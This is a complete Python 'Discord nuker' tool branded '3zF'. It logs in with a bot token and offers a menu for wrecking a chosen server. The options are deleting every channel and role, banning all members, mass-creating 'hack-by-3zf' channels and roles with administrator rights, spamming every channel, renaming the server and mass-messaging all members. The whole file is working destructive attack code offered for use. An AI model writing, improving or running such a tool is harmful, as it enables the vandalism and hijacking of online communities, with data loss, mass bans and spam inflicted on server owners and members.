import discord, asyncio, sys, random, time, threading, os
from discord.ext import commands

intents = discord.Intents.all()
client = commands.Bot(command_prefix="!", intents=intents, help_command=None)

guild_target = None
running = True
cnt = {"v": 0}
lck = threading.Lock()
chan_list = ["hack-by-3zf", "nuker-by-3zf", "owned-by-3zf"]
role_list = ["3zf", "nuked", "rekt"]

R = "\033[38;2;180;0;0m"
W = "\033[97m"
X = "\033[0m"

@client.event
async def on_ready():
    global guild_target
    os.system("cls || clear")
    
    banner()
    
    guilds = list(client.guilds)
    print(f"\n{R}[>] LOGGED AS : {W}{client.user}{X}")
    print(f"{R}============================================================{X}")
    
    for i, g in enumerate(guilds):
        print(f"{R}  [{i+1}] {W}{g.name} {R}({g.id}){X}")
    
    while True:
        try:
            ch = int(input(f"\n{R}[>] SELECT SERVER : {W}")) - 1
            if 0 <= ch < len(guilds):
                guild_target = guilds[ch]
                break
        except:
            pass
    
    os.system("cls || clear")
    show_target()
    # تشغيل المنيو في thread منفصل عشان ما يتعارض مع event loop
    threading.Thread(target=run_menu, daemon=True).start()

def banner():
    print(f"{R}██████╗ ███████╗███████╗{X}")
    print(f"{R}╚════██╗╚══███╔╝██╔════╝{X}")
    print(f"{R} █████╔╝  ███╔╝ █████╗{X}")
    print(f"{R} ╚═══██╗ ███╔╝  ██╔══╝{X}")
    print(f"{R}██████╔╝███████╗██║{X}")
    print(f"{R}╚═════╝ ╚══════╝╚═╝{X}")
    print(f"{R}============================================================{X}")
    print(f"{R}  DEVELOPER : 3zF{X}")
    print(f"{R}  TOOL      : DISCORD NUKER{X}")
    print(f"{R}============================================================{X}")

def show_target():
    print(f"{R}██████╗ ███████╗███████╗{X}")
    print(f"{R}╚════██╗╚══███╔╝██╔════╝{X}")
    print(f"{R} █████╔╝  ███╔╝ █████╗{X}")
    print(f"{R} ╚═══██╗ ███╔╝  ██╔══╝{X}")
    print(f"{R}██████╔╝███████╗██║{X}")
    print(f"{R}╚═════╝ ╚══════╝╚═╝{X}")
    print(f"{R}============================================================{X}")
    print(f"{R}  TARGET : {W}{guild_target.name}{X}")
    print(f"{R}  ID      : {W}{guild_target.id}{X}")
    print(f"{R}============================================================{X}")

def run_menu():
    """تشغيل المنيو في thread منفصل"""
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(show_menu())

async def show_menu():
    global running
    while running:
        print("")
        print(f"{R}┌──────────────────────────────────────────────────────────┐{X}")
        print(f"{R}│                                                          │{X}")
        print(f"{R}│              {W}3ZF DISCORD NUKER{R}                          │{X}")
        print(f"{R}│                                                          │{X}")
        print(f"{R}│           {R}[1]{W}  DELETE CHANNELS{R}                         │{X}")
        print(f"{R}│           {R}[2]{W}  DELETE ROLES{R}                             │{X}")
        print(f"{R}│           {R}[3]{W}  BAN ALL MEMBERS{R}                          │{X}")
        print(f"{R}│           {R}[4]{W}  CREATE CHANNELS{R}                           │{X}")
        print(f"{R}│           {R}[5]{W}  CREATE ROLES{R}                              │{X}")
        print(f"{R}│           {R}[6]{W}  SPAM MESSAGES{R}                             │{X}")
        print(f"{R}│           {R}[7]{W}  CHANGE SERVER NAME{R}                        │{X}")
        print(f"{R}│           {R}[8]{W}  DM ALL MEMBERS{R}                            │{X}")
        print(f"{R}│           {R}[0]{W}  EXIT{R}                                      │{X}")
        print(f"{R}│                                                          │{X}")
        print(f"{R}└──────────────────────────────────────────────────────────┘{X}")
        print(f"{X}")
        
        try:
            c = input(f"{R}[>] OPTION : {W}").strip()
        except:
            c = ""
        
        if c == "1":
            await del_chans()
        elif c == "2":
            await del_roles()
        elif c == "3":
            await ban_all()
        elif c == "4":
            print("")
            try:
                n = int(input(f"{R}[>] HOW MANY CHANNELS : {W}"))
            except:
                print(f"{R}[-] NUMBER{X}")
                continue
            
            print(f"{R}[*] CURRENT NAMES : {W}{', '.join(chan_list)}{X}")
            
            n1 = input(f"{R}[>] NAME 1 (ENTER=keep) : {W}").strip().lower().replace(" ","-")
            n2 = input(f"{R}[>] NAME 2 (ENTER=keep) : {W}").strip().lower().replace(" ","-")
            n3 = input(f"{R}[>] NAME 3 (ENTER=keep) : {W}").strip().lower().replace(" ","-")
            
            names = []
            if n1: names.append(n1)
            if n2: names.append(n2)
            if n3: names.append(n3)
            if names:
                chan_list.clear()
                chan_list.extend(names)
            
            await create_chans(n)
        elif c == "5":
            print("")
            try:
                n = int(input(f"{R}[>] HOW MANY ROLES : {W}"))
            except:
                print(f"{R}[-] NUMBER{X}")
                continue
            
            print(f"{R}[*] CURRENT NAMES : {W}{', '.join(role_list)}{X}")
            
            n1 = input(f"{R}[>] NAME 1 (ENTER=keep) : {W}").strip()
            n2 = input(f"{R}[>] NAME 2 (ENTER=keep) : {W}").strip()
            n3 = input(f"{R}[>] NAME 3 (ENTER=keep) : {W}").strip()
            names = []
            if n1: names.append(n1)
            if n2: names.append(n2)
            if n3: names.append(n3)
            if names:
                role_list.clear()
                role_list.extend(names)
            
            await create_roles(n)
        elif c == "6":
            await spam_all()
        elif c == "7":
            print("")
            await change_name()
        elif c == "8":
            print("")
            await dm_all()
        elif c == "0":
            running = False
            print(f"{R}[+] BYE{X}")
            os._exit(0)

async def del_chans():
    start = time.time()
    chs = list(guild_target.channels)
    cnt["v"] = 0
    sem = asyncio.Semaphore(50)
    
    async def work(ch):
        async with sem:
            try:
                await ch.delete()
                with lck: cnt["v"] += 1
            except:
                pass
    
    await asyncio.gather(*[work(ch) for ch in chs], return_exceptions=True)
    
    print(f"\n{R}[+] {W}{cnt['v']}{R} CHANNELS DELETED {W}[{time.time()-start:.2f}s]{X}")
    input(f"{R}[>] ENTER{X}")

async def del_roles():
    start = time.time()
    roles = [r for r in guild_target.roles if r.name != "@everyone"]
    cnt["v"] = 0
    sem = asyncio.Semaphore(50)
    
    async def work(r):
        async with sem:
            try:
                await r.delete()
                with lck: cnt["v"] += 1
            except:
                pass
    
    await asyncio.gather(*[work(r) for r in roles], return_exceptions=True)
    
    print(f"\n{R}[+] {W}{cnt['v']}{R} ROLES DELETED {W}[{time.time()-start:.2f}s]{X}")
    input(f"{R}[>] ENTER{X}")

async def ban_all():
    start = time.time()
    print(f"\n{R}[!] THIS WILL BAN EVERYONE{X}")
    confirm = input(f"{R}[>] TYPE yes : {W}")
    if confirm.lower() != "yes":
        print(f"{R}[-] CANCELLED{X}")
        input(f"{R}[>] ENTER{X}")
        return
    
    await guild_target.fetch_members()
    members = [m for m in guild_target.members if m.id != client.user.id]
    cnt["v"] = 0
    sem = asyncio.Semaphore(50)
    
    async def work(m):
        async with sem:
            try:
                await m.ban(reason="3zF")
                with lck: cnt["v"] += 1
            except:
                pass
    
    await asyncio.gather(*[work(m) for m in members], return_exceptions=True)
    
    print(f"\n{R}[+] {W}{cnt['v']}{R} MEMBERS BANNED {W}[{time.time()-start:.2f}s]{X}")
    input(f"{R}[>] ENTER{X}")

async def create_chans(n):
    start = time.time()
    
    cat_id = input(f"{R}[>] CATEGORY ID (ENTER=NONE) : {W}").strip()
    cat = None
    if cat_id:
        try:
            cat = client.get_channel(int(cat_id))
        except:
            pass
    
    cnt["v"] = 0
    sem = asyncio.Semaphore(20)
    
    async def work(i):
        async with sem:
            try:
                name = chan_list[i % len(chan_list)]
                if cat:
                    await guild_target.create_text_channel(name, category=cat)
                else:
                    await guild_target.create_text_channel(name)
                with lck: cnt["v"] += 1
            except:
                pass
    
    await asyncio.gather(*[work(i) for i in range(n)], return_exceptions=True)
    
    print(f"\n{R}[+] {W}{cnt['v']}{R} CHANNELS CREATED {W}[{time.time()-start:.2f}s]{X}")
    input(f"{R}[>] ENTER{X}")

async def create_roles(n):
    start = time.time()
    
    ci = input(f"{R}[>] HEX COLOR (FF0000) / random : {W}").strip()
    if ci.lower() == "random":
        color = random.randint(0, 0xFFFFFF)
    else:
        try:
            color = int(ci.replace("#",""), 16)
        except:
            color = 0xFF0000
    
    cnt["v"] = 0
    sem = asyncio.Semaphore(20)
    
    async def work(i):
        async with sem:
            try:
                name = role_list[i % len(role_list)]
                await guild_target.create_role(
                    name=name,
                    color=discord.Color(color),
                    permissions=discord.Permissions(administrator=True)
                )
                with lck: cnt["v"] += 1
            except:
                pass
    
    await asyncio.gather(*[work(i) for i in range(n)], return_exceptions=True)
    
    print(f"\n{R}[+] {W}{cnt['v']}{R} ROLES CREATED {W}[{time.time()-start:.2f}s]{X}")
    input(f"{R}[>] ENTER{X}")

async def spam_all():
    start = time.time()
    try:
        per = int(input(f"{R}[>] PER CHANNEL : {W}"))
    except:
        print(f"{R}[-] NUMBER{X}")
        input(f"{R}[>] ENTER{X}")
        return
    msg = input(f"{R}[>] MESSAGE : {W}")
    
    chs = [c for c in guild_target.text_channels]
    cnt["v"] = 0
    sem = asyncio.Semaphore(50)
    
    async def work(ch):
        async with sem:
            try:
                for _ in range(per):
                    await ch.send(msg)
                with lck: cnt["v"] += per
            except:
                pass
    
    await asyncio.gather(*[work(ch) for ch in chs], return_exceptions=True)
    
    print(f"\n{R}[+] {W}{cnt['v']}{R} MESSAGES SENT {W}[{time.time()-start:.2f}s]{X}")
    input(f"{R}[>] ENTER{X}")

async def change_name():
    name = input(f"{R}[>] NEW NAME : {W}")
    try:
        await guild_target.edit(name=name)
        print(f"{R}[+] NAME : {W}{name}{X}")
    except:
        print(f"{R}[-] FAILED{X}")
    
    input(f"{R}[>] ENTER{X}")

async def dm_all():
    start = time.time()
    msg = input(f"{R}[>] MESSAGE : {W}")
    
    await guild_target.fetch_members()
    members = [m for m in guild_target.members if m.id != client.user.id]
    cnt["v"] = 0
    sem = asyncio.Semaphore(10)
    
    async def work(m):
        async with sem:
            try:
                await m.send(msg)
                with lck: cnt["v"] += 1
                await asyncio.sleep(0.3)
            except:
                pass
    
    await asyncio.gather(*[work(m) for m in members], return_exceptions=True)
    
    print(f"\n{R}[+] {W}{cnt['v']}{R} DMS SENT {W}[{time.time()-start:.2f}s]{X}")
    input(f"{R}[>] ENTER{X}")

banner()

while True:
    token = input(f"\n{R}[>] TOKEN : {W}").strip()
    if token:
        break

try:
    client.run(token)
except Exception as e:
    os.system("cls || clear")
    banner()
    print(f"{R}[-] INVALID TOKEN OR ERROR: {e}{X}")
    time.sleep(2)
    os.execl(sys.executable, sys.executable, *sys.argv)
